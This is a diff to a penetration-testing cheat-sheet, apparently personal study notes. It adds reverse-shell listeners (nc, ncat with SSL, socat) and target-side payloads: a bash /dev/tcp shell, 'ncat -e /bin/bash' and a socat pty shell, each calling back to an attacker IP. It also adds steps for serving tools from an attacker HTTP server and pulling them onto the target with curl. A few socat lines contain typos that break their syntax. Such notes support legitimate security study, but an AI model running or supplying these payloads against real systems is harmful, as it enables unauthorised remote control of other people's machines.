@@ -41,15 +41,21 @@ wfuzz -sc <http-code> <wordlist.txt> <http://ip:port> # recieve only for this co
 ```
 
 # Reverse shell
+
 Set up a listener (before upload + executing the payload)
 ```bash
 nc -l -p <port> -vv # verbose, listen on port...
 pwncat-vl -l -p <port> # pwncat-cs no longer maintained for modern Python
+ncat -v -l <port> --ssl # for encryption (Secure Socket Layer)
+socat - tcp-listen:<port>, fork # ensure listener remains alive, - for stdin/stdout
+socat file:$(tty), raw, echo=0 tccp=listen:<port> # uses attacker's terminal located at tty. Raw for immediate charaters transmission 
 ```
 
-Make the target execute the payload through vulenrability exploit
+Make the target execute the payload through vulnerability exploit
 ```bash
-bash -c 'bash -i >& /dev/tcp/<ip>/<port> 0>&1' # redirect stdout and stderr to attacker machine and input to be executed where the stdout comes from (socket creation)
+bash -c 'bash -i >& /dev/tcp/<attacker-ip>/<port> 0>&1' # redirect stdout and stderr to attacker machine and input to be executed where the stdout comes from (socket creation). For TCP socket 
+ncat <attacker-ip> <port> --ssl -e /bin/bash -v # for SSL connection, the target needs netcat binary
+socat exec 'bash -i',pty,stderr tcp:<attacker-ip>:<port> #pty pseudo-terminal connected to socket, -i Interactive bash, redirects stderr to attacker
 ```
 
 After executing the payload, type commands (remote acccess)
@@ -59,3 +65,11 @@ pwncat-vl
 help
 back # remote terminal
 ```
+
+Binary (netcat, nmap...) sharing between Kali - Target with curl 
+````bash
+python -m http.server <port>
+which <binary>
+cp <path> <repertory> # where python server running
+cd /var/www/html # on target, binary to be wrote within
+curl -O http://<attacker-ip>:<python-server-port>/<binary>
